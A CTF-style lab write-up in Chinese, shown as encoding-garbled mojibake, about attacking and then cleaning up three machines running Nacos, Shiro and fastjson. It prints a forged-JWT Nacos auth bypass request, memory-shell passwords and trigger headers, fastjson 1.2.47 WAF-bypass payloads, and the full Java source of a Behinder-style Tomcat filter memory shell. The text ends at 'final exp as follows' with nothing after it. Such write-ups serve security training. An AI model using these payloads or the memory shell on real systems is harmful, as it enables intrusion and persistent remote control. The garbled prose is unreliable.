ç”±äºç¯å¢ƒç‰¹æ®Šï¼Œæš‚æ—¶æ— æ³•é€šè¿‡å…¶ä»–çš„æ–¹æ³•å¯¹æœºå™¨è¿›è¡Œé‡ç½®å¯†ç ï¼Œä¸”ç”±äºä¸šåŠ¡çš„é‡è¦æ€§ï¼Œä¸èƒ½å¤Ÿå¯¹æœåŠ¡å™¨è¿›è¡Œé‡å¯ç­‰ã€‚
æ ¹æ®ä»¥ä¸Šæ¡ä»¶ï¼š
è¯·åˆ©ç”¨å…ˆæ”»å†åº”æ€¥çš„ç‰¹æ®Šæ€ç»´æ–¹æ³•æ¥è¿›è¡Œåº”æ€¥ã€‚

ä»»åŠ¡ç›®æ ‡


å¯¹3å°æœºå™¨è¿›è¡Œåº”æ€¥æ’æŸ¥ï¼Œå¯¹å…¶ä¸­å¯èƒ½çš„åé—¨è¿›è¡Œæ’æŸ¥
ä¸èƒ½å¤Ÿé‡å¯æœºå™¨ï¼ˆé‡å¯åˆ™åˆ¤å®šåº”æ€¥å¤±è´¥ï¼‰
åœ¨ä½ è®¤ä¸ºåº”æ€¥æˆåŠŸä¹‹åï¼Œè¯·è·å–å¯¹åº”çš„flagï¼Œå¹¶å¯¹ä½ è·å–çš„flagè¿›è¡Œcheck

ä¿¡æ¯æ”¶é›†æ‰«æå­˜æ´»ä¸»æœºå’Œç«¯å£ï¼Œå‘ç°å¼€æ”¾äº†22ã€80ã€7848ã€8848ã€9848ã€9849ç«¯å£

è®¿é—®80ç«¯å£ç•Œé¢å¦‚ä¸‹ï¼š

å­˜åœ¨ä¸€ä¸ªç™»å½•å£ï¼Œç»å…¸fastjsoné¶æœºç•Œé¢

ç„¶åçœ‹7848ã€8848è¿™å‡ ä¸ªç«¯å£åº”è¯¥å°±æ˜¯nacosæœåŠ¡ï¼Œç›´æ¥è¯·æ±‚8848ç«¯å£æ˜¯å®ƒçš„Webæ§åˆ¶å°å¦‚ä¸‹ï¼š

webæ‰“ç‚¹Nacos Hessian ååºåˆ—åŒ–å¯åˆ©ç”¨Nacosèº«ä»½ç»•è¿‡æ¼æ´ç™»å½•åå°ï¼Œåå°å¯ä»¥å¾—åˆ°ä¸€äº›é…ç½®ä¿¡æ¯ï¼Œå¦‚shiro key
POST /nacos/v1/auth/users/login HTTP/1.1Host: 192.168.230.132:8848User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:104.0) Gecko/20100101 Firefox/104.0Accept: application/json, text/plain, */*Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 31Origin: http://192.168.230.132:8848Connection: closeReferer: http://192.168.230.132:8848/nacos/index.htmlAuthorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6IjE2OTcyMDU2MDAifQ.TFQnTkHxhNqYlo8c2kuluaoVkEcngSzgS08vjUjJaOsusername=najcos&amp;password=nacjos


æ¥ç€å°è¯•Nacos Hessian ååºåˆ—åŒ–æ¼æ´åˆ©ç”¨æˆåŠŸ
java -jar NacosRce.jar http://192.168.230.128:8848/nacos/ 7848 &quot;whoami&quot;



ä¸€ã€å†°èå†…å­˜é©¬ï¼š 1ã€éœ€è¦è®¾ç½®è¯·æ±‚å¤´x-client-data:rebeyond 2ã€è®¾ç½®Referer:https://www.google.com/ 3ã€è·¯å¾„éšæ„ 4ã€å¯†ç rebeyond
äºŒã€å“¥æ–¯æ‹‰å†…å­˜é©¬ï¼š 1ã€éœ€è¦è®¾ç½®è¯·æ±‚å¤´x-client-data:godzilla 2ã€è®¾ç½®Referer:https://www.google.com/ 3ã€è·¯å¾„éšæ„ 4ã€å¯†ç æ˜¯pass å’Œ key
ä¸‰ã€CMDå†…å­˜é©¬ï¼š 1ã€éœ€è¦è®¾ç½®è¯·æ±‚å¤´x-client-data:cmd 2ã€è®¾ç½®Referer:https://www.google.com/ 3ã€è¯·æ±‚å¤´cmd:è¦æ‰§è¡Œçš„å‘½ä»¤

è¿™é‡Œæœ‰ä¸ªé—®é¢˜ï¼Œç”¨å†°èå§‹ç»ˆè¿ä¸ä¸Šï¼Œå¯èƒ½è¿™åŒæ—¶æ³¨å…¥å†…å­˜é©¬å‡ºbugäº†

æ¢æˆå“¥æ–¯æ‹‰å°±æˆåŠŸè¿ä¸Šäº†


åº”æ€¥å“åº”â… 
çº¿ç´¢ï¼šè¿ç»´åœ¨ä»Šæ—¥ç™»å½•ç»´æŠ¤çš„æ—¶å€™ï¼Œå‘ç°sshæ— æ³•ç™»å½•ï¼Œç»è¿‡æ’æŸ¥å‘ç°sshå¯†ç ç›®å‰å·²ç»è¢«ä¿®æ”¹ã€‚

æŸ¥çœ‹passwdå’Œshadowæ–‡ä»¶ï¼Œåœ¨passwdæ–‡ä»¶ä¸­å¯ä»¥å‘ç°btç”¨æˆ·ç»™å‡ºçš„ç”¨æˆ·å†…å®¹æ ¼å¼æ˜¯ä¸ªä¸å¯»å¸¸çš„æ ¼å¼ï¼Œé€šå¸¸ä¸ä¼šåœ¨æ­£å¸¸ç”¨æˆ·ä¸­å‡ºç°ï¼ˆæ­£å¸¸çš„ç”¨æˆ·åº”è¯¥åŒ…å«ç”¨æˆ·åã€ç»è¿‡åŠ å¯†çš„å¯†ç å“ˆå¸Œå€¼ã€ä»¥åŠå…¶ä»–ç›¸å…³çš„ç”¨æˆ·ä¿¡æ¯ï¼‰
bt:adrla7IBSfTZQ:0:0:eval_to_root:/root:/bin/bash



æ¥ç€æˆ‘ä»¬å‘ç°å¼‚å¸¸ç”¨æˆ·btæ›¾ç»ç™»é™†è¿‡ï¼Œè¿˜æ˜¯ä¸ªç‰¹æƒç”¨æˆ·


äºæ˜¯åˆ é™¤btç”¨æˆ·ï¼ˆå›æ˜¾ç”¨æˆ·ä¸å­˜åœ¨æˆ‘è¿˜ä»¥ä¸ºå¤±è´¥äº†

åº”æ€¥æˆåŠŸï¼Œæ‹¿ä¸‹flag1ï¼šflag{6c3742aaf26a6dea7fe9d7731de59517}

who     æŸ¥çœ‹å½“å‰ç™»å½•ç”¨æˆ·ï¼ˆttyæœ¬åœ°ç™»é™†  ptsè¿œç¨‹ç™»å½•ï¼‰w       æŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯ï¼Œæƒ³çŸ¥é“æŸä¸€æ—¶åˆ»ç”¨æˆ·çš„è¡Œä¸ºuptime  æŸ¥çœ‹ç™»é™†å¤šä¹…ã€å¤šå°‘ç”¨æˆ·ï¼Œè´Ÿè½½1ã€æŸ¥è¯¢ç‰¹æƒç”¨æˆ·ç‰¹æƒç”¨æˆ·(uid ä¸º0)awk -F: &#x27;$3==0&#123;print $1&#125;&#x27; /etc/passwd2ã€æŸ¥è¯¢å¯ä»¥è¿œç¨‹ç™»å½•çš„å¸å·ä¿¡æ¯awk &#x27;/\$1|\$6/&#123;print $1&#125;&#x27; /etc/shadow3ã€é™¤rootå¸å·å¤–ï¼Œå…¶ä»–å¸å·æ˜¯å¦å­˜åœ¨sudoæƒé™ã€‚å¦‚éç®¡ç†éœ€è¦ï¼Œæ™®é€šå¸å·åº”åˆ é™¤sudoæƒé™more /etc/sudoers | grep -v &quot;^#\|^$&quot; | grep &quot;ALL=(ALL)&quot;4ã€ç¦ç”¨æˆ–åˆ é™¤å¤šä½™åŠå¯ç–‘çš„å¸å·usermod -L user    ç¦ç”¨å¸å·ï¼Œå¸å·æ— æ³•ç™»å½•ï¼Œ/etc/shadowç¬¬äºŒæ ä¸º!å¼€å¤´userdel user       åˆ é™¤userç”¨æˆ·userdel -r user    å°†åˆ é™¤userç”¨æˆ·ï¼Œå¹¶ä¸”å°†/homeç›®å½•ä¸‹çš„userç›®å½•ä¸€å¹¶åˆ é™¤5ã€rootçš„å†å²å‘½ä»¤histroy6ã€æ‰“å¼€/homeå„å¸å·ç›®å½•ä¸‹çš„.bash_historyï¼ŒæŸ¥çœ‹æ™®é€šå¸å·çš„å†å²å‘½ä»¤ä¸ºå†å²çš„å‘½ä»¤å¢åŠ ç™»å½•çš„IPåœ°å€ã€æ‰§è¡Œå‘½ä»¤æ—¶é—´ç­‰ä¿¡æ¯ï¼š1ï¼‰ä¿å­˜1ä¸‡æ¡å‘½ä»¤sed -i &#x27;s/^HISTSIZE=1000/HISTSIZE=10000/g&#x27; /etc/profile2ï¼‰åœ¨/etc/profileçš„æ–‡ä»¶å°¾éƒ¨æ·»åŠ å¦‚ä¸‹è¡Œæ•°é…ç½®ä¿¡æ¯ï¼š######jiagu history xianshi#########USER_IP=`who -u am i 2&gt;/dev/null | awk &#x27;&#123;print $NF&#125;&#x27; | sed -e &#x27;s/[()]//g&#x27;`if [ &quot;$USER_IP&quot; = &quot;&quot; ]thenUSER_IP=`hostname`fiexport HISTTIMEFORMAT=&quot;%F %T $USER_IP `whoami` &quot;shopt -s histappendexport PROMPT_COMMAND=&quot;history -a&quot;######### jiagu history xianshi ##########3ï¼‰source /etc/profileè®©é…ç½®ç”Ÿæ•ˆç”Ÿæˆæ•ˆæœï¼š 1  2018-07-10 19:45:39 192.168.204.1 root source /etc/profile7ã€å†å²æ“ä½œå‘½ä»¤çš„æ¸…é™¤ï¼šhistory -cä½†æ­¤å‘½ä»¤å¹¶ä¸ä¼šæ¸…é™¤ä¿å­˜åœ¨æ–‡ä»¶ä¸­çš„è®°å½•ï¼Œå› æ­¤éœ€è¦æ‰‹åŠ¨åˆ é™¤.bash_profileæ–‡ä»¶ä¸­çš„è®°å½•ã€‚

å†…ç½‘æ¸—é€
ä»£ç†é…ç½®æ­å»ºå°±å¿½ç•¥äº†~

å‘ç°ç¬¬äºŒå¼ ç½‘å¡ï¼š192.168.137.20

ç›´æ¥ä¸Šfscanæ‰«ï¼Œå‘ç°å­˜æ´»IPï¼š192.168.137.10å’Œ192.168.137.11

æ¥ç€å†å•ç‹¬æ‰«ä¸€ä¸‹è¿™ä¸¤ä¸ªIPï¼Œä¸¤ä¸ªå‡å¼€æ”¾äº†22å’Œ80ç«¯å£


shiro CBé“¾ ååºåˆ—åŒ–192.168.137.11çš„80ç«¯å£è®¿é—®å¦‚ä¸‹ï¼š

æŠ“åŒ…æµ‹è¯•å¯ä»¥å‘ç°è¯·æ±‚åŒ…çš„ Set-Cookie ä¸­å‡ºç° rememberMe=deleteMeï¼Œè¯´æ˜å­˜åœ¨shiroæ¡†æ¶

åœ¨å‰é¢nacosçš„é…ç½®æ–‡ä»¶ä¸­å¯ä»¥å¾—åˆ°shiroçš„key
#æƒé™è®¤è¯shiro:  enabled: true  set-login-uri: /login  key: KduO0i+zUIMcNNJnsZwU9Q==

ç›´æ¥å·¥å…·æ£€æµ‹ä¸€ä¸‹å‘ç°æœ‰å¯åˆ©ç”¨é“¾

æˆåŠŸæ³¨å…¥å†…å­˜é©¬


åº”æ€¥å“åº”â…¡æŸ¥çœ‹passwdå’Œshadowæ–‡ä»¶ï¼ŒåŒæ ·å‘ç°ä¸€ä¸ªå¯ç–‘ç”¨æˆ·guest


æ¥ç€å†æ¥æŸ¥çœ‹ç³»ç»Ÿæ—¥å¿—ã€ç™»å½•å†å²ç­‰ä¿¡æ¯ï¼Œå‘ç°guestç”¨æˆ·ä¹Ÿåœ¨9.26ç™»å½•è¿‡

äºæ˜¯åˆ é™¤guestç”¨æˆ·ï¼Œå¹¶ä¸”æ‰§è¡Œget_flagæ£€æµ‹å¤±è´¥

æ¥ç€åœ¨/home/vulntargetç›®å½•ä¸‹æ‰¾åˆ°å¯ç–‘æ–‡ä»¶app.jarï¼Œä¸‹è½½ä¸‹æ¥åç¼–è¯‘çœ‹ä¸€ä¸‹å³å¯ç¡®è®¤å°±æ˜¯è¿™ä¸ªæ–‡ä»¶æœ‰é—®é¢˜

ç„¶ååˆ©ç”¨å·¥å…·arthaså®ç°å†…å­˜é©¬çƒ­æ›´æ–°
é¦–å…ˆæŠŠjaråŒ…åç¼–è¯‘å¯¼å‡ºåï¼Œå°†åç¼–è¯‘æœ‰é—®é¢˜çš„åœ°æ–¹ä¿®æ”¹ä¸‹ï¼Œå†æŠŠ/bin/shç»™æ”¹ä¸€ä¸‹è®©å®ƒä¸èƒ½æ‰§è¡Œ

æ¥ç€åˆ†åˆ«å°†arthas-boot.jarå’Œarthas-tunnel-server-3.7.1-fatjar.jarä»¥åŠç¼–è¯‘å¥½åè§£å‹å¾—åˆ°çš„UserController.classéƒ½ä¸Šä¼ åˆ°/tmpç›®å½•ä¸‹ï¼Œé¦–æ¬¡è¿è¡Œä¼šå‡ºç°å¦‚ä¸‹æŠ¥é”™ï¼š
java -jar arthas-boot.jar[ERROR] Can not read arthas version from: https://arthas.aliyun.com/api/latest_version[ERROR] Can not find Arthas under local: /root/.arthas/lib and remote repo mirror: center[ERROR] Unable to download arthas from remote server, please download the full package according to wiki: https://github.com/alibaba/arthas


è¿™é‡Œéœ€è¦åœ¨æœ¬åœ°å»æ‰§è¡Œä¸€ä¸‹ï¼Œå®ƒä¼šå°†.arthasä¿å­˜åœ¨ç”¨æˆ·çš„éšè—æ–‡ä»¶ä¸‹

ç„¶åå†æŠŠå®ƒæ‰“åŒ…ä¸Šä¼ ï¼Œç”±äºè¯¥é¶æœºæ²¡æœ‰unzipï¼Œæˆ‘ä»¬å°†å…¶æ‰“åŒ…æˆtaråŒ…ï¼Œåœ¨/rootç›®å½•ä¸‹ä¸Šä¼ å¹¶è§£å‹
tar -cvf arthas.tar .arthastar -xvf arthas.tar



è§£å‹åå†å»æ‰§è¡Œå°±å¯ä»¥æˆåŠŸè¿›å…¥Arthaså·¥å…·ä¸­

æœ€åé‡æ–°è½¬æ¢å·²åŠ è½½çš„ç±»æ–‡ä»¶å®ç°çƒ­æ›´æ–°ï¼Œå†åç¼–è¯‘è¿™ä¸ªç±»çš„æºä»£ç ï¼Œå¯ä»¥å‘ç°ä¿®æ”¹æˆåŠŸäº†
retransform /tmp/arthas/UserController.classjad --source-only com.example.shiro550.controller.UserController


åº”æ€¥æˆåŠŸï¼Œæ‹¿ä¸‹flag2ï¼šflag{4b15f4d146ef4c128064f952ba11b874}

fastjson c3p0é“¾ äºŒæ¬¡åºåˆ—åŒ–æ¥ç€æ¥çœ‹192.168.137.10çš„å°±æ˜¯å‰é¢192.168.230.128çš„webç™»å½•é¡µé¢ï¼Œæ¢æµ‹å…·ä½“ç‰ˆæœ¬å‘ç°è¢«æ‹¦æˆªäº†

PS: å‰é¢æ‹¿burpçš„æ’ä»¶ç›´æ¥æ‰“bcelæ²¡æˆåŠŸåº”è¯¥ä¹Ÿæ˜¯è¢«æ‹¦æˆªäº†çš„ç¼˜æ•…


åˆ©ç”¨Fastjsoné»˜è®¤ä¼šå»é™¤é”®ã€å€¼å¤–çš„ç©ºæ ¼ã€\bã€\nã€\rã€\fç­‰ç‰¹æ€§ï¼Œå¹¶ä¸”è¿˜ä¼šè‡ªåŠ¨å°†é”®ä¸å€¼è¿›è¡Œunicodeä¸åå…­è¿›åˆ¶è§£ç 

åœ¨fastjsonä¸­ï¼Œå½“è§£æjsonå­—ç¬¦ä¸²æ—¶ï¼Œå®ƒä¼šè‡ªåŠ¨è§£ç Unicodeå’Œhexç¼–ç å­—ç¬¦ã€‚å› æ­¤æˆ‘ä»¬å¯ä»¥å°è¯•åˆ©ç”¨è¯¥ç‰¹å¾æ¥å®ç°ç¼–ç ç»•è¿‡ã€‚æˆ‘ä»¬å…ˆæ¥å°è¯•å°†åˆ©ç”¨æŠ¥é”™å›æ˜¾æ¥åˆ¤æ–­ç‰ˆæœ¬å·çš„pocè¿›è¡ŒUnicode&#x2F;hexç¼–ç ï¼Œå¯ä»¥çœ‹åˆ°è¿™é‡ŒæŠ›å‡ºå¼‚å¸¸æ˜¾ç¤ºå‡ºfastjsonç‰ˆæœ¬å·1.2.47ï¼Œè¯´æ˜å¯ä»¥é€šè¿‡Unicode&#x2F;hexç¼–ç æˆåŠŸç»•è¿‡waf
&#123;&quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;// ç¼–ç å‰å&#123;&quot;\u0040\u0074\u0079\u0070\u0065&quot;: &quot;java.lang.AutoCloseable&quot;&#123;&quot;\x40\x74\x79\x70\x65&quot;:&quot;java.lang.AutoCloseable&quot;



æˆ–è€…æ‹¿yakitçš„æ’ä»¶å¯ä»¥æ£€æµ‹åˆ°å…¶ç‰ˆæœ¬ä¸ºfastjson 1.2.47

ç°åœ¨å·²çŸ¥fastjsonç‰ˆæœ¬1.2.47ï¼Œèƒ½æ‰“çš„é“¾å­å°±æ˜¯bcelã€c3p0å’Œcommon-ioé“¾ï¼Œå¹¶ä¸”æµ‹è¯•å¯çŸ¥æ˜¯ä¸å‡ºç½‘çš„ï¼Œjndiå°±ä¸é€‚ç”¨äº†ï¼Œäºæ˜¯å°è¯•åˆ©ç”¨Unicodeç¼–ç ç»•è¿‡æ¥æ‰“ä¸€ä¸‹bcelï¼Œpayloadå¦‚ä¸‹ï¼Œtomcaté‚£é‡Œéœ€è¦æ¢ç€æµ‹è¯•

https://github.com/Getshell/Mshell/tree/main/03-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E6%88%98/01-Tomcat

&#123; &quot;rand1&quot;: &#123; &quot;\u0040\u0074\u0079\u0070\u0065&quot;: &quot;java.lang.Class&quot;, &quot;val&quot;: &quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot; &#125;, &quot;rand2&quot;: &#123; &quot;\u0040\u0074\u0079\u0070\u0065&quot;: &quot;java.lang.Class&quot;, &quot;val&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot; &#125;, &quot;rand3&quot;: [&#123; &quot;\u0040\u0074\u0079\u0070\u0065&quot;: &quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;, &quot;driverClassLoader&quot;: &#123; &quot;\u0040\u0074\u0079\u0070\u0065&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot; &#125;, &quot;driverClassName&quot;: &quot;$$BCEL$$$â€¦â€¦ï¼ˆå†…å­˜é©¬ï¼‰&quot; &#125;,&#123;&quot;$ref&quot;:&quot;$[&#x27;rand3&#x27;].connection&quot;&#125;] &#125;Tomcat 8.0ä»¥ä¸Šï¼Œorg.apache.tomcat.dbcp.dbcp2.BasicDataSourceTomcat 8.0ä»¥ä¸‹ï¼Œorg.apache.tomcat.dbcp.dbcp.BasicDataSourcecommon-dbcpï¼Œorg.apache.commons.dbcp.BasicDataSource

ä½†æ˜¯è¿™ä¸ªåº”è¯¥æ˜¯æ²¡tomcatæ‰“ä¸äº†bcel

ç„¶åcommon-ioé“¾é¶æœºåº”è¯¥ä¹Ÿæ²¡æœ‰é‚£ä¹ˆå¤šä¾èµ–ï¼ˆä¼°è®¡å®æˆ˜ä¸­æ‰ä¼šé‡åˆ°è¿™ç§ï¼Œå‘å¾ˆå¤šï¼‰ï¼Œæ‰€ä»¥å°±åªèƒ½æ‰“c3p0é“¾äº†ï¼Œå› æ­¤ä¸‹ä¸€æ­¥æ¢æµ‹å­˜åœ¨çš„ä¾èµ–ï¼Œåˆ©ç”¨Characterè½¬æ¢æŠ¥é”™å¯ä»¥åˆ¤æ–­å­˜åœ¨ä½•ç§ä¾èµ–

å‚è€ƒæ–‡ç« ï¼š
https://xz.aliyun.com/t/12492#toc-3
https://www.sec-in.com/article/950
https://y4tacker.github.io/2022/03/30/year/2022/3/%E6%B5%85%E8%B0%88Fastjson%E7%BB%95waf/

ä¾èµ–æ£€æµ‹é¡¹ç›®
org.springframework.web.bind.annotation.RequestMapping  //SpringBootorg.apache.catalina.startup.Tomcat  //Tomcatgroovy.lang.GroovyShell  //Groovy - 1.2.80com.mchange.v2.c3p0.DataSources  //C3P0com.mysql.jdbc.Buffer  //mysql-jdbc-5com.mysql.cj.api.authentication.AuthenticationProvider  //mysql-connect-6com.mysql.cj.protocol.AuthenticationProvider //mysql-connect-8sun.nio.cs.GBK  //JDK8java.net.http.HttpClient  //JDK11org.apache.ibatis.type.Alias  //Mybatisorg.apache.tomcat.dbcp.dbcp.BasicDataSource  //tomcat-dbcp-7-BCELorg.apache.tomcat.dbcp.dbcp2.BasicDataSource //tomcat-dbcp-8åŠä»¥å-BCELorg.apache.commons.io.Charsets       // å­˜åœ¨commons-io,ä½†ä¸ç¡®å®šç‰ˆæœ¬org.apache.commons.io.file.Counters  //commons-io-2.7-2.8org.aspectj.ajde.Ajde  //aspectjtools

RequestMappingæœ¬èº«ä¸ºSpringBootä¸‹çš„ç±»ï¼Œå½“å­˜åœ¨è¯¥ç±»æ—¶ä¼šæŠ¥å‡ºç±»å‹è½¬æ¢é”™è¯¯ï¼Œè¯´æ˜ä¸ºSpringBooté¡¹ç›®
&#123;  &quot;x&quot;: &#123;    &quot;\u0040\u0074\u0079\u0070\u0065&quot;: &quot;java.lang.Character&quot;&#123;      &quot;\u0040\u0074\u0079\u0070\u0065&quot;: &quot;java.lang.Class&quot;,      &quot;val&quot;: &quot;org.springframework.web.bind.annotation.RequestMapping&quot;    &#125;  &#125;


é€šè¿‡è¿™ç§æ–¹æ³•å¯ä»¥éªŒè¯å‡ºå­˜åœ¨c3p0ä¾èµ–
&#123;  &quot;x&quot;: &#123;    &quot;\u0040\u0074\u0079\u0070\u0065&quot;: &quot;java.lang.Character&quot;&#123;      &quot;\u0040\u0074\u0079\u0070\u0065&quot;: &quot;java.lang.Class&quot;,      &quot;val&quot;: &quot;com.mchange.v2.c3p0.DataSources&quot;    &#125;  &#125;


ç”±äºç›®æ ‡ä¸å‡ºç½‘ï¼Œå› æ­¤éœ€è¦åˆ©ç”¨TemplatesImplæ¥åŠ è½½æ¶æ„å­—èŠ‚ç ã€‚ä¸ºä½¿è¯¥æ¶æ„ç±»èƒ½å¤Ÿè¢«åŠ è½½ï¼Œéœ€ä»AbstractTransletç±»ç»§æ‰¿ï¼Œå¹¶é‡å†™ä»–çš„ä¸¤ä¸ªæ–¹æ³•ï¼Œæœ€åå°†è¯¥ç±»ç¼–è¯‘ä¸º.classæ–‡ä»¶

fastjsonä¸å‡ºç½‘å›æ˜¾åˆ©ç”¨ï¼šhttps://github.com/depycode/fastjson-c3p0

package sec;import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;import java.io.IOException;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.lang.reflect.Method;import java.util.Base64;import java.util.HashMap;import java.util.Map;import javax.crypto.Cipher;import javax.crypto.spec.SecretKeySpec;import javax.servlet.DispatcherType;import javax.servlet.Filter;import javax.servlet.FilterChain;import javax.servlet.FilterConfig;import javax.servlet.ServletException;import javax.servlet.ServletRequest;import javax.servlet.ServletResponse;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import javax.servlet.http.HttpSession;import org.apache.catalina.Context;import org.apache.catalina.core.ApplicationFilterConfig;import org.apache.catalina.core.StandardContext;import org.apache.catalina.loader.WebappClassLoaderBase;import org.apache.tomcat.util.descriptor.web.FilterDef;import org.apache.tomcat.util.descriptor.web.FilterMap;import sun.misc.BASE64Decoder;public class IceShell extends AbstractTranslet implements Filter &#123;    private final String pa = &quot;3ad2fddfe8bad8e6&quot;;    public IceShell() &#123;    &#125;    public void init(FilterConfig filterConfig) throws ServletException &#123;    &#125;    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123;        HttpServletRequest request = (HttpServletRequest)servletRequest;        HttpServletResponse response = (HttpServletResponse)servletResponse;        HttpSession session = request.getSession();        Map&lt;String, Object&gt; pageContext = new HashMap();        pageContext.put(&quot;session&quot;, session);        pageContext.put(&quot;request&quot;, request);        pageContext.put(&quot;response&quot;, response);        ClassLoader cl = Thread.currentThread().getContextClassLoader();        if (request.getMethod().equals(&quot;POST&quot;)) &#123;            Class Lclass;            if (cl.getClass().getSuperclass().getName().equals(&quot;java.lang.ClassLoader&quot;)) &#123;                Lclass = cl.getClass().getSuperclass();                this.RushThere(Lclass, cl, session, request, pageContext);            &#125; else if (cl.getClass().getSuperclass().getSuperclass().getName().equals(&quot;java.lang.ClassLoader&quot;)) &#123;                Lclass = cl.getClass().getSuperclass().getSuperclass();                this.RushThere(Lclass, cl, session, request, pageContext);            &#125; else if (cl.getClass().getSuperclass().getSuperclass().getSuperclass().getName().equals(&quot;java.lang.ClassLoader&quot;)) &#123;                Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass();                this.RushThere(Lclass, cl, session, request, pageContext);            &#125; else if (cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getName().equals(&quot;java.lang.ClassLoader&quot;)) &#123;                Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();                this.RushThere(Lclass, cl, session, request, pageContext);            &#125; else if (cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getName().equals(&quot;java.lang.ClassLoader&quot;)) &#123;                Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();                this.RushThere(Lclass, cl, session, request, pageContext);            &#125; else &#123;                Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();                this.RushThere(Lclass, cl, session, request, pageContext);            &#125;            filterChain.doFilter(servletRequest, servletResponse);        &#125;    &#125;    public void destroy() &#123;    &#125;    public void RushThere(Class Lclass, ClassLoader cl, HttpSession session, HttpServletRequest request, Map&lt;String, Object&gt; pageContext) &#123;        byte[] bytecode = Base64.getDecoder().decode(&quot;yv66vgAAADQAGgoABAAUCgAEABUHABYHABcBAAY8aW5pdD4BABooTGphdmEvbGFuZy9DbGFzc0xvYWRlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQADTFU7AQABYwEAF0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQABZwEAFShbQilMamF2YS9sYW5nL0NsYXNzOwEAAWIBAAJbQgEAClNvdXJjZUZpbGUBAAZVLmphdmEMAAUABgwAGAAZAQABVQEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAC2RlZmluZUNsYXNzAQAXKFtCSUkpTGphdmEvbGFuZy9DbGFzczsAIQADAAQAAAAAAAIAAAAFAAYAAQAHAAAAOgACAAIAAAAGKiu3AAGxAAAAAgAIAAAABgABAAAAAgAJAAAAFgACAAAABgAKAAsAAAAAAAYADAANAAEAAQAOAA8AAQAHAAAAPQAEAAIAAAAJKisDK763AAKwAAAAAgAIAAAABgABAAAAAwAJAAAAFgACAAAACQAKAAsAAAAAAAkAEAARAAEAAQASAAAAAgAT&quot;);        try &#123;            Method define = Lclass.getDeclaredMethod(&quot;defineClass&quot;, byte[].class, Integer.TYPE, Integer.TYPE);            define.setAccessible(true);            Class uclass = null;            try &#123;                uclass = cl.loadClass(&quot;U&quot;);            &#125; catch (ClassNotFoundException var18) &#123;                uclass = (Class)define.invoke(cl, bytecode, 0, bytecode.length);            &#125;            Constructor constructor = uclass.getDeclaredConstructor(ClassLoader.class);            constructor.setAccessible(true);            Object u = constructor.newInstance(this.getClass().getClassLoader());            Method Um = uclass.getDeclaredMethod(&quot;g&quot;, byte[].class);            Um.setAccessible(true);            String k = &quot;3ad2fddfe8bad8e6&quot;;            session.setAttribute(&quot;u&quot;, k);            Cipher c = Cipher.getInstance(&quot;AES&quot;);            c.init(2, new SecretKeySpec(k.getBytes(), &quot;AES&quot;));            byte[] eClassBytes = c.doFinal((new BASE64Decoder()).decodeBuffer(request.getReader().readLine()));            Class eclass = (Class)Um.invoke(u, eClassBytes);            Object a = eclass.newInstance();            Method b = eclass.getDeclaredMethod(&quot;equals&quot;, Object.class);            b.setAccessible(true);            b.invoke(a, pageContext);        &#125; catch (Exception var19) &#123;        &#125;    &#125;    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;    &#125;    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;    &#125;    static &#123;        try &#123;            String name = &quot;AutomneGreet&quot;;            WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase)Thread.currentThread().getContextClassLoader();            StandardContext standardContext = (StandardContext)webappClassLoaderBase.getResources().getContext();            Field Configs = Class.forName(&quot;org.apache.catalina.core.StandardContext&quot;).getDeclaredField(&quot;filterConfigs&quot;);            Configs.setAccessible(true);            Map filterConfigs = (Map)Configs.get(standardContext);            if (filterConfigs.get(&quot;AutomneGreet&quot;) == null) &#123;                Filter filter = new IceShell();                FilterDef filterDef = new FilterDef();                filterDef.setFilter(filter);                filterDef.setFilterName(&quot;AutomneGreet&quot;);                filterDef.setFilterClass(filter.getClass().getName());                standardContext.addFilterDef(filterDef);                FilterMap filterMap = new FilterMap();                filterMap.addURLPattern(&quot;/shell&quot;);                filterMap.setFilterName(&quot;AutomneGreet&quot;);                filterMap.setDispatcher(DispatcherType.REQUEST.name());                standardContext.addFilterMapBefore(filterMap);                Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);                constructor.setAccessible(true);                ApplicationFilterConfig filterConfig = (ApplicationFilterConfig)constructor.newInstance(standardContext, filterDef);                filterConfigs.put(&quot;AutomneGreet&quot;, filterConfig);            &#125;        &#125; catch (Exception var10) &#123;        &#125;    &#125;&#125;

æœ€ç»ˆexpå¦‚ä¸‹ï¼š
